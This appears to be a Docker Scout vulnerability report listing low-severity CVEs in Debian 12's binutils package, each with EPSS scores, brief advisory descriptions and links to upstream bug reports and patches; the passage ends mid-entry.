<a href="https://scout.docker.com/v/CVE-2025-1179?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--1179" src="https://img.shields.io/badge/CVE--2025--1179-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.337%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>56th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in GNU Binutils 2.43. It has been rated as critical. Affected by this issue is the function bfd_putl64 of the file bfd/libbfd.c of the component ld. The manipulation leads to memory corruption. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 2.44 is able to address this issue. It is recommended to upgrade the affected component. The code maintainer explains, that "[t]his bug has been fixed at some point between the 2.43 and 2.44 releases".

---
- binutils 2.44-1 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32640
binutils not covered by security support
No exact commits pinpointed, but upstream confirms this fixed in 2.44

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1178?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--1178" src="https://img.shields.io/badge/CVE--2025--1178-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.357%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>57th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in GNU Binutils 2.43. It has been declared as problematic. Affected by this vulnerability is the function bfd_putl64 of the file libbfd.c of the component ld. The manipulation leads to memory corruption. The attack can be launched remotely. The complexity of an attack is rather high. The exploitation appears to be difficult. The exploit has been disclosed to the public and may be used. The identifier of the patch is 75086e9de1707281172cc77f178e7949a4414ed0. It is recommended to apply a patch to fix this issue.

---
- binutils 2.45-3 (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1108986)
https://sourceware.org/bugzilla/show_bug.cgi?id=32638
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=75086e9de1707281172cc77f178e7949a4414ed0
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1176?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--1176" src="https://img.shields.io/badge/CVE--2025--1176-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.348%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>57th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in GNU Binutils 2.43 and classified as critical. This issue affects the function _bfd_elf_gc_mark_rsec of the file elflink.c of the component ld. The manipulation leads to heap-based buffer overflow. The attack may be initiated remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. The patch is named f9978defb6fab0bd8583942d97c112b0932ac814. It is recommended to apply a patch to fix this issue.

---
- binutils 2.45-3 (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1108986)
https://sourceware.org/bugzilla/show_bug.cgi?id=32636
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=f9978defb6fab0bd8583942d97c112b0932ac814
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1153?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--1153" src="https://img.shields.io/badge/CVE--2025--1153-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.599%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>69th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability classified as problematic was found in GNU Binutils 2.43/2.44. Affected by this vulnerability is the function bfd_set_format of the file format.c. The manipulation leads to memory corruption. The attack can be launched remotely. The complexity of an attack is rather high. The exploitation appears to be difficult. Upgrading to version 2.45 is able to address this issue. The identifier of the patch is 8d97c1a53f3dc9fd8e1ccdb039b8a33d50133150. It is recommended to upgrade the affected component.

---
- binutils 2.45-3 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32603
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=8d97c1a53f3dc9fd8e1ccdb039b8a33d50133150
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1152?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--1152" src="https://img.shields.io/badge/CVE--2025--1152-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.181%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>40th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability classified as problematic has been found in GNU Binutils 2.43. Affected is the function xstrdup of the file xstrdup.c of the component ld. The manipulation leads to memory leak. It is possible to launch the attack remotely. The complexity of an attack is rather high. The exploitability is told to be difficult. The exploit has been disclosed to the public and may be used. It is recommended to apply a patch to fix this issue. The code maintainer explains: "I'm not going to commit some of the leak fixes I've been working on to the 2.44 branch due to concern that would destabilise ld. All of the reported leaks in this bugzilla have been fixed on binutils master."

---
- binutils 2.45-3 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32576
binutils not covered by security support
These were fixed in master, so 2.45 at the time

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1151?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--1151" src="https://img.shields.io/badge/CVE--2025--1151-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.167%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>38th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in GNU Binutils 2.43. It has been rated as problematic. This issue affects the function xmemdup of the file xmemdup.c of the component ld. The manipulation leads to memory leak. The attack may be initiated remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. It is recommended to apply a patch to fix this issue. The code maintainer explains: "I'm not going to commit some of the leak fixes I've been working on to the 2.44 branch due to concern that would destabilise ld. All of the reported leaks in this bugzilla have been fixed on binutils master."

---
- binutils 2.45-3 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32576
binutils not covered by security support
These were fixed in master, so 2.45 at the time

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1150?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--1150" src="https://img.shields.io/badge/CVE--2025--1150-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.181%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>40th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in GNU Binutils 2.43. It has been declared as problematic. This vulnerability affects the function bfd_malloc of the file libbfd.c of the component ld. The manipulation leads to memory leak. The attack can be initiated remotely. The complexity of an attack is rather high. The exploitation appears to be difficult. The exploit has been disclosed to the public and may be used. It is recommended to apply a patch to fix this issue. The code maintainer explains: "I'm not going to commit some of the leak fixes I've been working on to the 2.44 branch due to concern that would destabilise ld. All of the reported leaks in this bugzilla have been fixed on binutils master."

---
- binutils 2.45-3 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32576
binutils not covered by security support
These were fixed in master, so 2.45 at the time

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-11495?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--11495" src="https://img.shields.io/badge/CVE--2025--11495-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.027%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was determined in GNU Binutils 2.45. The affected element is the function elf_x86_64_relocate_section of the file elf64-x86-64.c of the component Linker. This manipulation causes heap-based buffer overflow. The attack can only be executed locally. The exploit has been publicly disclosed and may be utilized. Patch name: 6b21c8b2ecfef5c95142cbc2c32f185cb1c26ab0. To fix this issue, it is recommended to deploy a patch.

---
- binutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33502
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=6b21c8b2ecfef5c95142cbc2c32f185cb1c26ab0
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-11494?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--11494" src="https://img.shields.io/badge/CVE--2025--11494-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.027%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in GNU Binutils 2.45. Impacted is the function _bfd_x86_elf_late_size_sections of the file bfd/elfxx-x86.c of the component Linker. The manipulation results in out-of-bounds read. The attack needs to be approached locally. The exploit has been made public and could be used. The patch is identified as b6ac5a8a5b82f0ae6a4642c8d7149b325f4cc60a. A patch should be applied to remediate this issue.

---
- binutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33499
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=b6ac5a8a5b82f0ae6a4642c8d7149b325f4cc60a
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1149?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--1149" src="https://img.shields.io/badge/CVE--2025--1149-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.181%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>40th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in GNU Binutils 2.43. It has been classified as problematic. This affects the function xstrdup of the file libiberty/xmalloc.c of the component ld. The manipulation leads to memory leak. It is possible to initiate the attack remotely. The complexity of an attack is rather high. The exploitability is told to be difficult. The exploit has been disclosed to the public and may be used. It is recommended to apply a patch to fix this issue. The code maintainer explains: "I'm not going to commit some of the leak fixes I've been working on to the 2.44 branch due to concern that would destabilise ld. All of the reported leaks in this bugzilla have been fixed on binutils master."

---
- binutils 2.45-3 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32576
binutils not covered by security support
These were fixed in master, so 2.45 at the time

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1148?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--1148" src="https://img.shields.io/badge/CVE--2025--1148-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.405%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>60th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in GNU Binutils 2.43 and classified as problematic. Affected by this issue is the function link_order_scan of the file ld/ldelfgen.c of the component ld. The manipulation leads to memory leak. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. It is recommended to apply a patch to fix this issue. The code maintainer explains: "I'm not going to commit some of the leak fixes I've been working on to the 2.44 branch due to concern that would destabilise ld. All of the reported leaks in this bugzilla have been fixed on binutils master."

---
- binutils 2.45-3 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32576
binutils not covered by security support
These were fixed in master, so 2.45 at the time

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1147?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--1147" src="https://img.shields.io/badge/CVE--2025--1147-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.390%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>60th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability has been found in GNU Binutils 2.43 and classified as problematic. Affected by this vulnerability is the function __sanitizer::internal_strlen of the file binutils/nm.c of the component nm. The manipulation of the argument const leads to buffer overflow. The attack can be launched remotely. The complexity of an attack is rather high. The exploitation appears to be difficult. The exploit has been disclosed to the public and may be used.

---
- binutils 2.45-3 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32556
binutils not covered by security support
These were fixed in master, so 2.45 at the time

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-11414?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--11414" src="https://img.shields.io/badge/CVE--2025--11414-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.027%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was determined in GNU Binutils 2.45. Affected by this vulnerability is the function get_link_hash_entry of the file bfd/elflink.c of the component Linker. This manipulation causes out-of-bounds read. The attack can only be executed locally. The exploit has been publicly disclosed and may be utilized. Upgrading to version 2.46 addresses this issue. Patch name: aeaaa9af6359c8e394ce9cf24911fec4f4d23703. It is advisable to upgrade the affected component.

---
- binutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33450
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=aeaaa9af6359c8e394ce9cf24911fec4f4d23703
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-11413?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--11413" src="https://img.shields.io/badge/CVE--2025--11413-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.027%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in GNU Binutils 2.45. Affected is the function elf_link_add_object_symbols of the file bfd/elflink.c of the component Linker. The manipulation results in out-of-bounds read. The attack needs to be approached locally. The exploit has been made public and could be used. Upgrading to version 2.46 is able to address this issue. The patch is identified as 72efdf166aa0ed72ecc69fc2349af6591a7a19c0. Upgrading the affected component is advised.

---
- binutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33452
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=72efdf166aa0ed72ecc69fc2349af6591a7a19c0
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-11412?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--11412" src="https://img.shields.io/badge/CVE--2025--11412-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.027%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability has been found in GNU Binutils 2.45. This impacts the function bfd_elf_gc_record_vtentry of the file bfd/elflink.c of the component Linker. The manipulation leads to out-of-bounds read. Local access is required to approach this attack. The exploit has been disclosed to the public and may be used. The identifier of the patch is 047435dd988a3975d40c6626a8f739a0b2e154bc. To fix this issue, it is recommended to deploy a patch.

---
- binutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33452
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=047435dd988a3975d40c6626a8f739a0b2e154bc
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-11083?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--11083" src="https://img.shields.io/badge/CVE--2025--11083-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.026%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability has been found in GNU Binutils 2.45. The affected element is the function elf_swap_shdr in the library bfd/elfcode.h of the component Linker. The manipulation leads to heap-based buffer overflow. The attack must be carried out locally. The exploit has been disclosed to the public and may be used. The identifier of the patch is 9ca499644a21ceb3f946d1c179c38a83be084490. To fix this issue, it is recommended to deploy a patch. The code maintainer replied with "[f]ixed for 2.46".

---
- binutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33457
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=9ca499644a21ceb3f946d1c179c38a83be084490
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-11082?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--11082" src="https://img.shields.io/badge/CVE--2025--11082-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.023%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw has been found in GNU Binutils 2.45. Impacted is the function _bfd_elf_parse_eh_frame of the file bfd/elf-eh-frame.c of the component Linker. Executing manipulation can lead to heap-based buffer overflow. The attack is restricted to local execution. The exploit has been published and may be used. This patch is called ea1a0737c7692737a644af0486b71e4a392cbca8. A patch should be applied to remediate this issue. The code maintainer replied with "[f]ixed for 2.46".

---
- binutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33464
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=ea1a0737c7692737a644af0486b71e4a392cbca8
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-11081?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--11081" src="https://img.shields.io/badge/CVE--2025--11081-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.027%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was detected in GNU Binutils 2.45. This issue affects the function dump_dwarf_section of the file binutils/objdump.c. Performing manipulation results in out-of-bounds read. The attack is only possible with local access. The exploit is now public and may be used. The patch is named f87a66db645caf8cc0e6fc87b0c28c78a38af59b. It is suggested to install a patch to address this issue.

---
- binutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33406
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=f87a66db645caf8cc0e6fc87b0c28c78a38af59b
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-0840?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--0840" src="https://img.shields.io/badge/CVE--2025--0840-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.443%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>63rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability, which was classified as problematic, was found in GNU Binutils up to 2.43. This affects the function disassemble_bytes of the file binutils/objdump.c. The manipulation of the argument buf leads to stack-based buffer overflow. It is possible to initiate the attack remotely. The complexity of an attack is rather high. The exploitability is told to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 2.44 is able to address this issue. The identifier of the patch is baac6c221e9d69335bf41366a1c7d87d8ab2f893. It is recommended to upgrade the affected component.

---
- binutils 2.43.90.20250122-1 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32560
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=baac6c221e9d69335bf41366a1c7d87d8ab2f893
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-57360?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2024--57360" src="https://img.shields.io/badge/CVE--2024--57360-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.028%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

https://www.gnu.org/software/binutils/ nm >=2.43 is affected by: Incorrect Access Control. The type of exploitation is: local. The component is: `nm --without-symbol-version` function.

---
- binutils 2.43.50.20241221-1 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32467
Fixed by: https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=5f8987d3999edb26e757115fe87be55787d510b9
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-53589?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2024--53589" src="https://img.shields.io/badge/CVE--2024--53589-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.180%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>40th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU objdump 2.43 is vulnerable to Buffer Overflow in the BFD (Binary File Descriptor) library's handling of tekhex format files.

---
- binutils 2.44-1 (unimportant)
https://bushido-sec.com/index.php/2024/12/05/binutils-objdump-tekhex-buffer-overflow/
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=e0323071916878e0634a6e24d8250e4faff67e88 (binutils-2_44)
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-1972?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2023--1972" src="https://img.shields.io/badge/CVE--2023--1972-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.045%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>14th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A potential heap based buffer overflow was found in _bfd_elf_slurp_version_tables() in bfd/elf.c. This may lead to loss of availability.

---
- binutils 2.41-1 (unimportant)
https://sourceware.org/git/?p=binutils-gdb.git;a=blobdiff;f=bfd/elf.c;h=185028cbd97ae0901c4276c8a4787b12bb75875a;hp=027d01437352555bc4ac0717cb0486c751a7775d;hb=c22d38baefc5a7a1e1f5cdc9dbb556b1f0ec5c57;hpb=f2f9bde5cde7ff34ed0a4c4682a211d402aa1086
https://sourceware.org/bugzilla/show_bug.cgi?id=30285
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2021-32256?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2021--32256" src="https://img.shields.io/badge/CVE--2021--32256-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.115%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>31st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in GNU libiberty, as distributed in GNU Binutils 2.36. It is a stack-overflow issue in demangle_type in rust-demangle.c.

---
- binutils <unfixed> (unimportant)
https://bugs.launchpad.net/ubuntu/+source/binutils/+bug/1927070
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-9996?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2018--9996" src="https://img.shields.io/badge/CVE--2018--9996-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.385%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>59th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in cplus-dem.c in GNU libiberty, as distributed in GNU Binutils 2.30. Stack Exhaustion occurs in the C++ demangling functions provided by libiberty, and there are recursive stack frames: demangle_template_value_parm, demangle_integral_value, and demangle_expression.

---
- binutils <unfixed> (unimportant)
https://gcc.gnu.org/bugzilla/show_bug.cgi?id=85304
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-20712?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2018--20712" src="https://img.shields.io/badge/CVE--2018--20712-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.010%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>77th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A heap-based buffer over-read exists in the function d_expression_1 in cp-demangle.c in GNU libiberty, as distributed in GNU Binutils 2.31.1. A crafted input can cause segmentation faults, leading to denial-of-service, as demonstrated by c++filt.

---
- binutils <unfixed> (unimportant)
https://gcc.gnu.org/bugzilla/show_bug.cgi?id=88629
https://sourceware.org/bugzilla/show_bug.cgi?id=24043
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-20673?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2018--20673" src="https://img.shields.io/badge/CVE--2018--20673-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
